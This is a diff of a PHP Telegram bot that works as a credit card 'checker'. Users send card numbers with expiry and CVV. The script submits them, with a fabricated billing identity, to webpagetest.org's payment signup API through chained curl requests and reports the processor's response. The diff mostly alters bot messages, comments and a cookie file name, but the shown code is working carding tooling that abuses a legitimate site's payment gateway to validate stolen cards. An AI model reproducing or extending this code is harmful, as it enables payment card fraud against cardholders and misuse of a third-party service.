@@ -86,7 +86,7 @@ if (preg_match('/^(\/bu|\.bu|!bu)/', $text)) {
     $message = substr($message, 4);
     $messageidtoedit1 = bot('sendmessage', [
         'chat_id' => $chat_id,
-        'text' => "<b>𝙍𝙀𝘼𝘿𝙄𝙉𝙂 𝙐𝙍 𝙍𝙀𝙌𝙐𝙀𝙎𝙏 ✅</b>",
+        'text' => "<b>Please wait.......</b>",
         'parse_mode' => 'html',
         'reply_to_message_id' => $message_id
     ]);
@@ -105,7 +105,7 @@ $c4 = substr($cc, -4);
         bot('editMessageText', [
             'chat_id' => $chat_id,
             'message_id' => $messageidtoedit,
-            'text' => "!𝙔𝙤𝙪 𝘿𝙪𝙢𝙗𝙤 𝘼𝙨𝙨 𝙃𝙤𝙡𝙚!\n𝙏𝙚𝙭𝙩 𝙎𝙝𝙤𝙪𝙡𝙙 𝙊𝙣𝙡𝙮 𝘾𝙤𝙣𝙩𝙖𝙞𝙣 - <code>$gcm cc|mm|yy|cvv</code>\n𝙂𝙖𝙩𝙚𝙬𝙖𝙮 - <b>$gate</b>",
+            'text' => "𝙏𝙚𝙭𝙩 𝙎𝙝𝙤𝙪𝙡𝙙 𝙊𝙣𝙡𝙮 𝘾𝙤𝙣𝙩𝙖𝙞𝙣 - <code>$gcm cc|mm|yy|cvv</code>\n𝙂𝙖𝙩𝙚𝙬𝙖𝙮 - <b>$gate</b>",
             'parse_mode' => 'html',
             'disable_web_page_preview' => 'true'
         ]);
@@ -186,7 +186,7 @@ $c4 = substr($cc, -4);
         $str = explode($end, $str[1]);
         return $str[0];
     }
-
+#request 01
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://www.webpagetest.org/signup');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -201,6 +201,7 @@ curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 $curl1 = curl_exec($ch);
 $at = trim(strip_tags(getStr($curl1,'auth_token" value="','"')));
+
 
 # 2 Req..
 $ch = curl_init();
@@ -238,7 +239,7 @@ $curl2 = curl_exec($ch);
           'disable_web_page_preview' => 'true'
       ]);
 
-#02 Req..
+#03 Req..
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://www.webpagetest.org/signup');
 curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15); 
@@ -282,7 +283,7 @@ curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
 curl_setopt($ch, CURLOPT_POSTFIELDS, '{"key":"chjs_6nx8y5rbw875f78dn5yx7n9g","revision":"2022-12-05","credit_card":{"first_name":"jay","last_name":"mehta","full_number":"'.$cc.'","expiration_month":"'.$mes.'","expiration_year":"'.$ano.'","cvv":"'.$cvv.'","device_data":"","billing_address":"gardenia drive 6767","billing_city":"San Jose","billing_state":"CA","billing_country":"US","billing_zip":"92055"},"origin":"https://www.webpagetest.org"}');
 $curl4 = curl_exec($ch);
 $rsp = trim(strip_tags(getStr($curl4,'Processor declined: ','"}')));
